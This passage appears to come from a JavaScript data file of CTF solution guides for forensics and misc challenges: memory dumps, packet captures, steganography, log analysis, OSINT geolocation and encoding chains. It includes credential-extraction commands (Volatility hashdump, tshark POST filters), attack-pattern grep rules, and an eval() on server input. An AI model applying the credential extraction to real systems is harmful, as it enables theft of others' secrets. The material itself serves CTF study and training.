        "Check alternate data streams (NTFS): find . -type f -exec getfattr -d {} \\;"
      ],
      commands: ["fdisk -l image.img  # check partitions", "mount -o loop,ro,offset=$((sector*512)) image.img /mnt", "photorec image.img  # recover deleted files"],
      tools: ["Autopsy", "photorec/foremost", "strings", "debugfs", "The Sleuth Kit"],
      concepts: ["Disk forensics", "file carving", "slack space", "deleted file recovery", "filesystem journal"]
    },
    {
      name: "Memory Dump Analysis",
      category: "Forensics",
      difficulty: "Medium",
      description: "Given a memory dump, extract processes, credentials, network connections, or hidden data.",
      approach: "Use Volatility to analyze the memory dump systematically.",
      solution: [
        "Identify profile: vol.py -f dump.raw imageinfo",
        "Process list: vol.py -f dump.raw --profile=Win7SP1x64 pslist",
        "Hidden processes: vol.py -f dump.raw psscan (finds hidden/unlinked processes)",
        "Network: vol.py -f dump.raw netscan",
        "Command history: vol.py -f dump.raw cmdscan / consoles",
        "Dump process: vol.py -f dump.raw procdump -p PID -D output/",
        "Strings in memory: vol.py -f dump.raw strings -s strings.txt",
        "Registry: vol.py -f dump.raw hivelist / hashdump",
        "Malware: vol.py -f dump.raw malfind (finds injected code)"
      ],
      commands: ["vol.py -f dump.raw imageinfo", "vol.py -f dump.raw --profile=Win7SP1x64 pslist", "vol.py -f dump.raw --profile=Win7SP1x64 hashdump"],
      tools: ["Volatility 2/3", "strings", "YARA"],
      concepts: ["Memory forensics", "process analysis", "credential extraction", "malware detection"]
    },
    {
      name: "PCAP Analysis",
      category: "Forensics",
      difficulty: "Easy-Medium",
      description: "Given a packet capture, find credentials, exfiltrated data, or reconstruct files.",
      approach: "Open in Wireshark, follow streams, extract objects, look for cleartext credentials.",
      solution: [
        "Open in Wireshark: wireshark capture.pcap",
        "Statistics > Protocol Hierarchy (overview of protocols)",
        "Follow TCP/HTTP streams: right-click > Follow > TCP Stream",
        "Extract HTTP objects: File > Export Objects > HTTP",
        "Find credentials: filter 'http.request.method == POST' or 'ftp' or 'telnet'",
        "DNS exfiltration: filter 'dns' and look for suspicious long subdomain queries",
        "Extract files: use NetworkMiner or binwalk on carved data",
        "TLS: if you have the private key, Edit > Preferences > TLS > RSA keys list",
        "Useful filters: ip.addr==X, tcp.port==Y, http contains 'flag', dns.qry.name contains 'evil'"
      ],
      commands: ["tshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e http.file_data", "tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name"],
      tools: ["Wireshark", "tshark", "NetworkMiner", "tcpdump"],
      concepts: ["Packet analysis", "stream reconstruction", "protocol analysis", "data exfiltration"]
    },
    {
      name: "Steganography",
      category: "Forensics",
      difficulty: "Easy-Hard",
      description: "Data hidden within image, audio, or other media files.",
      approach: "Check file metadata, LSB encoding, embedded files, spectrograms.",
      solution: [
        "Check metadata: exiftool image.png",
        "Check for appended data: binwalk image.png",
        "Extract embedded files: binwalk -e image.png or foremost image.png",
        "Strings: strings image.png | grep -i flag",
        "LSB steganography: zsteg image.png (PNG/BMP) or stegsolve (visual)",
        "Password-protected: steghide extract -sf image.jpg -p password",
        "Audio: open in Audacity, check spectrogram view",
        "PNG specific: check IDAT chunks, try stegoveritas",
        "Whitespace: look for tabs/spaces encoding binary (snow, whitespace steg)"
      ],
      commands: ["exiftool image.png", "binwalk -e image.png", "zsteg image.png", "steghide extract -sf image.jpg"],
      tools: ["exiftool", "binwalk", "zsteg", "stegsolve", "steghide", "stegoveritas", "Audacity"],
      concepts: ["Steganography", "LSB encoding", "EXIF metadata", "file carving", "spectrogram"]
    },
    {
      name: "Log Analysis",
      category: "Forensics",
      difficulty: "Easy-Medium",
      description: "Given log files (web server, auth, syslog), reconstruct an attack timeline or find indicators.",
      approach: "Parse logs, identify anomalies, correlate timestamps, trace attacker actions.",
      solution: [
        "Web access logs: grep for suspicious paths (../.. , /admin, /wp-login, shell.php)",
        "Find attacker IP: sort by frequency, look for scanner patterns",
        "Auth logs: grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn",
        "Timeline: sort all events by timestamp across log sources",
        "Look for: brute force (many failed logins), directory traversal, SQL injection in URLs",
        "PowerShell logs: Event ID 4104 (script block logging) for encoded commands",
        "Decode base64 in PowerShell: echo 'encoded' | base64 -d"
      ],
      commands: ["cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head  # top IPs", "grep -E '(\\.\\./|UNION|SELECT|<script)' access.log  # attack patterns"],
      tools: ["grep", "awk", "sort", "CyberChef", "ELK Stack"],
      concepts: ["Log analysis", "timeline reconstruction", "IOC extraction", "attack pattern identification"]
    }
  ],

  misc: [
    {
      name: "OSINT — Find the Location",
      category: "Misc/OSINT",
      difficulty: "Easy-Medium",
      description: "Given an image, find where it was taken using visual clues and metadata.",
      approach: "Check EXIF GPS data, identify visual landmarks, language on signs, vegetation, architecture.",
      solution: [
        "EXIF data: exiftool image.jpg | grep GPS",
        "If GPS coords found: paste into Google Maps",
        "Visual clues: road signs (language, style), license plates, sun position, vegetation",
        "Google Lens / reverse image search: images.google.com",
        "Street signs: identify country by sign shape and color",
        "Architecture style: helps narrow region",
        "Power lines/outlets: different plug types by country",
        "GeoGuessr techniques apply"
      ],
      commands: ["exiftool -GPS* image.jpg"],
      tools: ["exiftool", "Google Maps", "Google Lens", "overpass-turbo"],
      concepts: ["OSINT", "geolocation", "EXIF metadata", "visual intelligence"]
    },
    {
      name: "Encoding Chain",
      category: "Misc",
      difficulty: "Easy",
      description: "Flag encoded through multiple layers: base64, hex, ROT13, URL encoding, etc.",
      approach: "Identify the outermost encoding, decode, repeat until plaintext flag appears.",
      solution: [
        "Base64: looks like A-Za-z0-9+/= , length is multiple of 4, often ends with =",
        "Hex: only 0-9a-f characters, even length",
        "URL encoding: contains %XX sequences",
        "ROT13: English-looking but nonsensical",
        "Binary: only 0s and 1s (8-bit groups)",
        "Morse: dots and dashes",
        "CyberChef 'Magic' recipe: auto-detects and decodes multiple layers"
      ],
      commands: ["echo 'data' | base64 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'"],
      tools: ["CyberChef (Magic recipe)", "dcode.fr", "Python"],
      concepts: ["Encoding", "Base64", "hex", "ROT13", "URL encoding", "multi-layer decoding"]
    },
    {
      name: "Scripting / Automation Challenge",
      category: "Misc",
      difficulty: "Medium",
      description: "Server presents math problems, CAPTCHAs, or puzzles that must be solved quickly (within seconds).",
      approach: "Script the interaction: connect, parse the challenge, compute answer, send response.",
      solution: [
        "Connect with pwntools: r = remote('host', port)",
        "Receive challenge: line = r.recvline()",
        "Parse with regex: import re; nums = re.findall(r'\\d+', line)",
        "Compute answer: result = eval(expression)  # or safe_eval",
        "Send answer: r.sendline(str(result))",
        "Repeat in loop until flag is received",
        "For web: use Python requests with session for cookies"
      ],
      commands: ["python3 solve.py  # custom automation script"],
      tools: ["pwntools", "Python requests", "Python re"],
      concepts: ["Scripting", "automation", "socket programming", "parsing", "speed challenges"]
    }
  ]
};
